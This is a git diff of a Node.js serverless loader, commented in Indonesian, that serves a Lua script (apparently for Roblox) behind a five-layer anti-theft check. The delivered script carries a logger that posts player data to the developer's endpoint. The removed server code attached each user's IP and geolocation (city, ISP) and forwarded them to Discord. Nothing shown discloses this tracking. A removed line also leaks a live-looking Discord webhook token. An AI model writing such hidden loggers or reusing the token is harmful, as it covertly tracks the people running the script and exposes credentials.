@@ -4,7 +4,6 @@ const https = require('https');
 // SETTINGS
 // ============================
 const SETTINGS = {
-    WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
     TOTAL_LAYERS: 5,
     MIN_WAIT: 112, 
     MAX_WAIT: 119, 
@@ -12,7 +11,7 @@ const SETTINGS = {
     KEY_LIFETIME: 5000,   
     // URL SUMBER RAW GITHUB
     PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
-    REAL_SCRIPT_URL: "https://api.rubis.app/v2/scrap/bMUJDedIAAvDDdeW/raw"
+    REAL_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader/refs/heads/main/SLFB.lua"
 };
 
 // ==========================================
@@ -43,43 +42,24 @@ function getRandomError() {
 }
 
 // ==========================================
-// FUNGSI WEBHOOK EMBED (HANYA UNTUK SECURITY/DETECTION)
+// FUNGSI KIRIM SECURITY LOG KE log.js (BUKAN LANGSUNG KE DISCORD)
 // ==========================================
-function getWIBTime() {
-    return new Intl.DateTimeFormat('id-ID', {
-        timeZone: 'Asia/Jakarta',
-        dateStyle: 'medium',
-        timeStyle: 'medium'
-    }).format(new Date());
-}
-
-async function sendWebhookLog(message) {
+async function sendSecurityLogViaLogJs(message, ip) {
     const data = JSON.stringify({ 
-        embeds: [{
-            title: "❗️Ndraawz Security❗️",
-            description: message,
-            color: 0xff0000,
-            footer: { text: "Ndraawz Security | WIB: " + getWIBTime() }
-        }]
+        type: "security",
+        message: message,
+        ip: ip
     });
-
-    const url = new URL(SETTINGS.WEBHOOK);
-    const options = {
-        hostname: url.hostname,
-        path: url.pathname,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(data)
-        }
-    };
-
-    return new Promise(function(resolve) {
-        const req = https.request(options, function(res) {
-            res.on('data', function(chunk) {});
-            res.on('end', function() { resolve(true); });
+    
+    return new Promise((resolve) => {
+        const req = https.request('https://ndraawzz-developer.vercel.app/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        }, (res) => {
+            res.resume();
+            resolve(true);
         });
-        req.on('error', function() { resolve(false); });
+        req.on('error', () => resolve(false));
         req.write(data);
         req.end();
     });
@@ -172,7 +152,10 @@ if requestFunc then
             Url = "https://ndraawzz-developer.vercel.app/api/log",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({ fields = fields })
+            Body = HttpService:JSONEncode({ 
+                type = "player",
+                fields = fields 
+            })
         })
     end)
     if not success then
@@ -185,113 +168,10 @@ end
 }
 
 // ==========================================
-// ENDPOINT LOGGER (dipanggil dari client)
-// ==========================================
-async function handleLog(req, res) {
-    let body = '';
-    await new Promise((resolve) => {
-        req.on('data', chunk => { body += chunk; });
-        req.on('end', resolve);
-    });
-    
-    // Ambil IP dari header request (bukan dari client!)
-    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
-    const cleanIp = clientIp.replace('::ffff:', '');
-    
-    try {
-        const data = JSON.parse(body);
-        
-        // Ambil geolokasi dari IP (via server, client gak tahu URL nya)
-        let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
-        
-        await new Promise((resolve) => {
-            https.get(`https://ipwhois.io/json/${cleanIp}`, (geoRes) => {
-                let geoBody = '';
-                geoRes.on('data', chunk => geoBody += chunk);
-                geoRes.on('end', () => {
-                    try {
-                        const json = JSON.parse(geoBody);
-                        if (json && json.success !== false && json.country) {
-                            geoData = {
-                                country: json.country || "N/A",
-                                region: json.region || "N/A",
-                                city: json.city || "N/A",
-                                isp: json.isp || "N/A",
-                                as: json.asn || "N/A",
-                                org: json.org || "N/A"
-                            };
-                        }
-                    } catch(e) {}
-                    resolve();
-                });
-            }).on('error', () => resolve());
-        });
-        
-        // Gabungkan fields dari client + IP dari server
-        const allFields = [
-            ...(data.fields || []),
-            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION (SERVER) ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
-            { name: "📡 IP Address", value: cleanIp, inline: false },
-            { name: "🚩 Country", value: geoData.country, inline: false },
-            { name: "📍 Region", value: geoData.region, inline: false },
-            { name: "🏙️ City", value: geoData.city, inline: false },
-            { name: "🏢 ISP", value: geoData.isp, inline: false },
-            { name: "📡 AS / Org", value: geoData.as + " / " + geoData.org, inline: false }
-        ];
-        
-        const embed = {
-            title: "🚀 Ndraawz Logger",
-            color: 0x00ff88,
-            fields: allFields,
-            timestamp: new Date().toISOString()
-        };
-        
-        // Kirim ke Discord
-        await sendWebhookLogEmbed(embed);
-        console.log(`✅ Log terkirim untuk IP: ${cleanIp}`);
-        res.status(200).json({ ok: true });
-        
-    } catch (err) {
-        console.error("Error handleLog:", err);
-        res.status(500).json({ error: err.message });
-    }
-}
-
-// Fungsi kirim embed ke Discord
-async function sendWebhookLogEmbed(embed) {
-    const data = JSON.stringify({ embeds: [embed] });
-    const url = new URL(SETTINGS.WEBHOOK);
-    const options = {
-        hostname: url.hostname,
-        path: url.pathname,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(data)
-        }
-    };
-    
-    return new Promise((resolve) => {
-        const req = https.request(options, (res) => {
-            res.on('data', () => {});
-            res.on('end', () => resolve(true));
-        });
-        req.on('error', () => resolve(false));
-        req.write(data);
-        req.end();
-    });
-}
-
-// ==========================================
 // MAIN HANDLER (ANTI-CURI 5 LAYER)
 // ==========================================
 module.exports = async function(req, res) {
     const url = req.url || "";
-    
-    // Endpoint untuk logger
-    if (url === '/api/log' && req.method === 'POST') {
-        return handleLog(req, res);
-    }
     
     // ========== ANTI-CURI 5 LAYER ==========
     res.setHeader('Content-Type', 'text/plain');
@@ -346,7 +226,9 @@ module.exports = async function(req, res) {
             // One-time use check
             if (session.used === true) {
                 blacklist[ip] = true;
-                await sendWebhookLog("🚫 **REPLAY ATTACK**\n**IP:** `" + ip + "` mencoba akses ulang link mati.");
+                // Kirim security log ke log.js (bukan langsung ke Discord)
+                await sendSecurityLogViaLogJs("🚫 **REPLAY ATTACK** - Mencoba akses ulang link mati", ip);
+                delete sessions[id];
                 return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
             }
             
@@ -368,7 +250,8 @@ module.exports = async function(req, res) {
             if (timeSinceLastRequest < session.requiredWait) {
                 blacklist[ip] = true;
                 delete sessions[id];
-                await sendWebhookLog("🚫 **DETECT BOT**\n**IP:** `" + ip + "` timing violation (No Tolerance).");
+                // Kirim security log ke log.js (bukan langsung ke Discord)
+                await sendSecurityLogViaLogJs("🚫 **DETECT BOT** - Timing violation (No Tolerance)", ip);
                 return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
             }
             session.used = true;
@@ -442,8 +325,7 @@ module.exports = async function(req, res) {
         }
         
         // ========== LAYER TERAKHIR: KIRIM LOGGER + SCRIPT UTAMA ==========
-        // HAPUS sendWebhookLog sukses! Biar tidak mengirim log kosong.
-        // Yang mengirim log player adalah logger script, BUKAN dari sini.
+        // TIDAK mengirim log apapun dari sini (biar log.js yang handle)
         if (sessions[id].currentIndex === SETTINGS.TOTAL_LAYERS - 1) {
             // Ambil script utama dari REAL_SCRIPT_URL
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
